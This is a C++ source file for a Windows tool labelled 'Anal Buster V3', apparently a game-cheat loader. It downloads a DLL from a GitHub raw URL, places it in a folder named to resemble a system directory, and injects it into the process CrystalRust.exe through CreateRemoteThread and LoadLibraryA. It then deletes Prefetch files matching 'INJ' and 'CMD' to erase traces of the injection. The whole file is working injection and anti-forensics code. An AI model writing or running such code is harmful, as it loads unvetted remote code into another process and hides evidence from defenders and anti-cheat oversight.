#define CURL_STATICLIB
#include <iostream>
#include <wtypes.h>
#include <lmcons.h>
#include <fstream>
#include <tlhelp32.h>
#include <algorithm>
#include <filesystem>
#include <curl/curl.h>
#include "Functions.h"
#pragma warning(disable:4996)
namespace fs = std::filesystem;
using namespace std;

HANDLE hConsole;
static size_t write_data(void* ptr, size_t size, size_t nmemb, FILE* stream)
{
	size_t written = fwrite(ptr, size, nmemb, stream);
	return written;
}


bool fileExists(const std::string& filePath) {
	std::ifstream file(filePath);
	return file.good();
}

std::string toLower(const std::string& str) {
	std::string result = str;
	std::transform(result.begin(), result.end(), result.begin(), [](unsigned char c) { return std::tolower(c); });
	return result;
}

DWORD findProcessId(const std::string& processName) {
	DWORD processId = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(snapshot, &processEntry)) {
			while (Process32Next(snapshot, &processEntry)) {
				std::string currentProcessName = toLower(processEntry.szExeFile);

				if (currentProcessName == toLower(processName)) {
					processId = processEntry.th32ProcessID;
					break;
				}
			}
		}

		CloseHandle(snapshot);
	}

	return processId;
}

int clear(const char* fold, const char *pat) {
	const char* folderPath = fold;
	const char* searchPattern = pat;

	WIN32_FIND_DATA findFileData;
	HANDLE hFind = FindFirstFile((std::string(folderPath) + "\\*").c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::cerr << "Error with opening folder" << std::endl;
		return -1;
	}

	do {
		if (strstr(findFileData.cFileName, searchPattern) != nullptr) {
			std::string filePath = std::string(folderPath) + "\\" + findFileData.cFileName;

			if (DeleteFile(filePath.c_str())) {
				std::cout << "File Removed: " << filePath << std::endl;
			}
			else {
				std::cerr << "Error!: " << filePath << std::endl;
			}
		}
	} while (FindNextFile(hFind, &findFileData) != 0);

}

int getProc(HANDLE* handleToProc, DWORD pid)
{
	*handleToProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	DWORD dwLastError = GetLastError();

	if (*handleToProc == NULL)
	{

		cout << "Error";
		cout << "[";
		SetConsoleTextAttribute(hConsole, 12);
		cout << "-";
		SetConsoleTextAttribute(hConsole, 8);
		cout << "]" << '\n';
		return -1;
	}
	else
	{
		std::cout << "Successfully Injected";
		std::cout << "[";
		SetConsoleTextAttribute(hConsole, 2);
		std::cout << "+";
		SetConsoleTextAttribute(hConsole, 8);
		std::cout << "]\n";
		return 1;
	}
}


int InjectDLL(DWORD PID, const char* dll) {

	HANDLE handleToProc;
	LPVOID LoadLibAddr;
	LPVOID baseAddr;
	HANDLE remThread;

	int dllLength = strlen(dll) + 1;

	if (getProc(&handleToProc, PID) < 0)
		return -1;

	LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	if (!LoadLibAddr)
		return -1;

	baseAddr = VirtualAllocEx(handleToProc, NULL, dllLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!baseAddr)
		return -1;

	if (!WriteProcessMemory(handleToProc, baseAddr, dll, dllLength, NULL)) {
		cout << "Dll Not Found In!";

		return -1;
	}


	remThread = CreateRemoteThread(handleToProc, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, baseAddr, 0, NULL);

	if (!remThread)
		return -1;

	WaitForSingleObject(remThread, INFINITE);

	VirtualFreeEx(handleToProc, baseAddr, dllLength, MEM_RELEASE);


	if (CloseHandle(remThread) == 0)
	{
		cout << "Failed To Close Handle To Remote Thread";
		return -1;
	}

	if (CloseHandle(handleToProc) == 0)
	{
		cout << "Failed To Close Handle To Target Procces\n";
		return -1;
	}
}

int mainFunc() {

	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTitle("Anal Buster V3");
	SetConsoleTextAttribute(hConsole, 8);


	std::cout << "installing files" << '\n';
	CURL* curl = curl_easy_init();
	FILE* file = fopen("EventHandler.dll", "wb");


	curl_easy_setopt(curl, CURLOPT_URL, "https://raw.githubusercontent.com/DarkLord6789/1246/main/fatality.dll");
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);


	CURLcode response = curl_easy_perform(curl);
	curl_easy_cleanup(curl);
	fclose(file);

	fs::path currentPath = fs::current_path();

	currentPath += "\\EventHandler.dll";

	fs::path WillBeIn = "C:/WindowsEvent/";

	if (!fs::exists(currentPath)) {
		std::cout << "idi nahui" << '\n';
	}


	fs::path dirPath = "C:/WindowsEvent";


	try {
		fs::create_directory(dirPath);
		std::cout << "Directory created successfully." << std::endl;
	}
	catch (const std::filesystem::filesystem_error& e) {
		std::cerr << "Error creating directory: " << e.what() << std::endl;
		return -1;
	}


	try {
		if (fs::exists("C:/WindowsEvent/EventHandler.dll")) {
			std::filesystem::permissions("C:/WindowsEvent/EventHandler.dll", std::filesystem::perms::owner_all | std::filesystem::perms::group_all, std::filesystem::perm_options::add);
			fs::remove("C:/WindowsEvent/EventHandler.dll");
			std::cout << "Deleted Old File" << std::endl;
		}
		
		fs::copy(currentPath, WillBeIn);
		std::cout << "File copied successfully." << std::endl;
	}
	catch (std::exception& e) {
		std::cout << "Error copying file: " << e.what() << std::endl;
	}

	fs::remove(currentPath);

	std::cout << "finished installing files!" << '\n';


	std::cout << currentPath << '\n';

	cout << "Attempt To Inject";
	cout << "[";
	SetConsoleTextAttribute(hConsole, 14);
	cout << "Wait";
	SetConsoleTextAttribute(hConsole, 8);
	cout << "]\n";
	Sleep(4000);

	std::string processName = "CrystalRust.exe";

	DWORD PID = findProcessId(processName);

	if (PID == 0) {
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "Process " << processName << " Not Found" << std::endl;
		SetConsoleTextAttribute(hConsole, 8);
	}

	Sleep(4000);

	std::filesystem::path filePath = "C:/WindowsEvent/EventHandler.dll";

	if (!fs::exists(filePath)) {
		std::cout << "File Not Found!";
		std::cout << "[";
		SetConsoleTextAttribute(hConsole, 12);
		cout << "You Need To Put Your File In The Current Directory";
		SetConsoleTextAttribute(hConsole, 8);
		cout << "]";
		Sleep(5000);
		return 0;
	}
	const char* dll = "C:/WindowsEvent/EventHandler.dll";

	const char* folderPath = "C:\\Windows\\Prefetch";
	const char* searchPattern = "INJ";

	InjectDLL(PID, dll);

	clear(folderPath, searchPattern);

	const char* searchPattern2 = "CMD";

	clear(folderPath, searchPattern2);

	std::cout << "Waiting For Next Files..." << '\n';

	Sleep(30000);

	clear(folderPath, searchPattern);

	Sleep(5000);

	clear(folderPath, searchPattern2);

	std::cout << "Can Close!" << '\n';

}